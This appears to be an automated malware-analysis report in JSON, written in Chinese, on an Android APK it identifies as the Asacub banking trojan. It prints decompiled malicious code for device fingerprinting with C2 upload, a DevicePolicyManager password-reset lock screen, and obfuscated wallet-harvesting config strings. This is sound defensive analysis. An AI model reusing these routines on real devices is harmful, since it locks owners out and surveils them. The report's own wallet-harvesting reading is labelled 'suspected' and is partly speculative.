@@ -1,0 +1,116 @@
+{
+  "APK信息": {
+    "文件名": "27cea60e23b0f62b4b131da29fdda916bc4539c34bb142fb6d3f8bb82380fe4c.apk",
+    "sha256": "27cea60e23b0f62b4b131da29fdda916bc4539c34bb142fb6d3f8bb82380fe4c",
+    "包名": "com.guydq.guydql",
+    "应用名": "MMS_SMS_NEW",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 661.9
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\guydq\\guydql\\Bfbbccb;",
+          "method_signature": "if(this.C == null || this.C.isEmpty()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.n.put(h.ag, this.d.getNetworkCountryIso()).put(h.al, this.d.getNetworkOperatorName()).put(h.ac, g()).put(h.am, this.d.getNetworkType());\na.a().a(1, this.n);\nprivate String g() {\n    if (this.C == null || this.C.isEmpty()) {\n        this.C = ((TelephonyManager) Eaebeeabda.a().getSystemService(\"phone\")).getDeviceId();\n    }\n    return this.C;\n}",
+          "malicious_code_snippet_context": "              }\n              this.n.put(h.ab, i);\n              if (a.a().a) {\n>>>                 this.n.put(h.ag, this.d.getNetworkCountryIso()).put(h.al, this.d.getNetworkOperatorName()).put(h.ac, g()).put(h.am, this.d.getNetworkType());\n>>>             }\n>>>             a.a().a(1, this.n);\n>>>         } catch (Throwable th) {\n>>>         }\n>>>     }\n>>> \n>>>     private String g() {\n          if (this.C == null || this.C.isEmpty()) {\n              try {\n                  this.C = ((TelephonyManager) Eaebeeabda.a().getSystemService(\"phone\")).getDeviceId();",
+          "behavior_description": "该代码通过 TelephonyManager 系统服务采集设备指纹：g() 方法调用 getDeviceId() 获取 IMEI 设备唯一标识符（带缓存到 this.C 以便重复使用），同时收集网络国家码、运营商名称、网络类型等信息，将全部数据封装进 Map（this.n）后通过 a.a().a(1, this.n) 静默上报至远程服务器（C2）。结合该样本已被确认为 Asacub 银行木马，且类名高度混淆，此设备指纹采集用于受感染设备的注册与追踪，为后续 C2 下发指令、定向攻击做准备，属于隐私窃取行为。数据流向：TelephonyManager.getDeviceId()/getNetworkCountryIso()/getNetworkOperatorName()/getNetworkType() → 网络上报至攻击者控制的远程服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "resetPassword"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\guydq\\guydql\\k;",
+          "method_signature": "a(DevicePolicyManager devicePolicyManager, ComponentName componentName, long j)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "devicePolicyManager.resetPassword(a(String.valueOf(System.currentTimeMillis())).substring(0, 10), 0);\ndevicePolicyManager.getClass().getMethod(h.bf, ComponentName.class, Integer.TYPE).invoke(devicePolicyManager, componentName, 9);\ndevicePolicyManager.getClass().getMethod(h.bg, ComponentName.class, Integer.TYPE).invoke(devicePolicyManager, componentName, Integer.MAX_VALUE);\ndevicePolicyManager.getClass().getMethod(h.bh, new Class[0]).invoke(devicePolicyManager, new Object[0]);\nh.a(true);\nh.a(j);",
+          "malicious_code_snippet_context": "      }\n  \n      static void a(DevicePolicyManager devicePolicyManager, ComponentName componentName, long j) throws IllegalAccessException, InvocationTargetException {\n>>>         devicePolicyManager.resetPassword(a(String.valueOf(System.currentTimeMillis())).substring(0, 10), 0);\n>>>         devicePolicyManager.getClass().getMethod(h.bf, ComponentName.class, Integer.TYPE).invoke(devicePolicyManager, componentName, 9);\n>>>         devicePolicyManager.getClass().getMethod(h.bg, ComponentName.class, Integer.TYPE).invoke(devicePolicyManager, componentName, Integer.MAX_VALUE);\n>>>         devicePolicyManager.getClass().getMethod(h.bh, new Class[0]).invoke(devicePolicyManager, new Object[0]);\n>>>         h.a(true);\n>>>         h.a(j);\n          try {\n              TimeUnit.SECONDS.sleep(1L);\n          } catch (InterruptedException e) {",
+          "behavior_description": "该代码是典型的勒索锁屏实现：以当前系统时间戳 System.currentTimeMillis() 为种子生成随机字符串，截取前10位作为新密码，调用 DevicePolicyManager.resetPassword() 静默重置设备锁屏密码（用户完全不知晓该密码）；随后通过反射调用被混淆的隐藏 DevicePolicyManager API（h.bf 传入 9 疑似 setMaximumFailedPasswordsForWipe 设置失败次数上限，h.bg 传入 Integer.MAX_VALUE 疑似 setPasswordHistoryLength 防止密码回滚，h.bh 无参调用疑似 lockNow() 立即锁屏），并通过 h.a(true)/h.a(j) 持久化锁定状态，最终将用户彻底锁在设备之外，符合 Asacub 家族银行木马的勒索锁屏模块特征",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "crypto_wallet_detection",
+      "中文名": "加密钱包地址采集",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "1hQTzTtiJKgzw8f7osXnqCmxXq4SVx/LvIrdQ4UrZQR29cWBgXhnpdJJ22hQ9g",
+          "0h4KpzV+O6M+36bopcb8qSGhGacaeRzDq57bWQ",
+          "1hQTzT9hLq4xy4jpuMTn6S2yBagPXA"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\guydq\\guydql\\h;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "crypto_wallet_detection",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "static final List<String> i = new CopyOnWriteArrayList();\n        static final List<String> j = new CopyOnWriteArrayList();\n        static final String r = k.d(\"1hQTzTtiJKgzw8f7osXnqCmxXq4SVx/LvIrdQ4UrZQR29cWBgXhnpdJJ22hQ9g\");\n        static final String s = k.d(\"1hQTzT1jL70wz420pc/lsjS4Fb0VVxyJtZrcQ4g\");\n        static final String t = k.d(\"1hQTzTtiJKgzw8f7osXnqCmxXq4QS1bXvInbQ5U0cw9j\");",
+          "malicious_code_snippet_context": "      static final String d = null;\n      static final String e = k.d(\"gEkY1D5pL/Y5wIs\");\n      static final String f = k.d(\"hUxL1z1uea49w9k\");\n>>>     static final List<String> i = new CopyOnWriteArrayList();\n>>>     static final List<String> j = new CopyOnWriteArrayList();\n>>>     static volatile boolean l = false;\n>>>     static final String m = k.d(\"xw5QkD5oOa0+yIL3o8P8qyU\");\n>>>     static final String n = k.d(\"1BkRkShPOaA+wor7v9U\");\n      static final String o = k.d(\"0h4KpzV+O6M+36bopcb8qSGhGacaeRzDq57bWQ\");\n      static final String p = k.d(\"0h4KpzV+O6M+36T/v9L0oCWXH60E\");\n      static final String q = k.d(\"1hQTzT1jL70wz420v9jmsyW4BaA\");",
+          "behavior_description": "该类是Asacub银行木马（Trojan-Banker.AndroidOS.Asacub）的加密配置类，位于伪装的随机包名com.guydq.guydql下。代码使用自定义解密函数k.d()对大量敏感配置字符串进行加密存储以规避静态分析检测，其中变量r/s/t等共享相同密文前缀（解密后应为同族特征串，即加密货币钱包地址检测特征/正则模式或钱包应用标识），并配合CopyOnWriteArrayList并发列表i/j实时收集匹配到的钱包地址数据。数据流向：k.d()解密出钱包检测特征→用于匹配用户剪贴板/短信/设备中的加密钱包地址→匹配结果写入并发收集列表→供木马后续将窃取的钱包信息回传C2服务器，直接威胁用户加密资产安全。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
